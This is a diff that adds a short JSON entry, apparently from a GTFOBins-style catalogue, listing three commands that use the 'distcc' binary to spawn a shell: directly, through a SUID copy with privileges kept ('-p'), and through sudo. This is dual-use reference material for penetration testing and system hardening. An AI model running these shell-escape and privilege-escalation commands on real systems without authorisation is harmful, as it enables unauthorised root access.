@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "distcc /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./distcc /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo distcc /bin/sh\n"
+      }
+    ]
+  }
+}
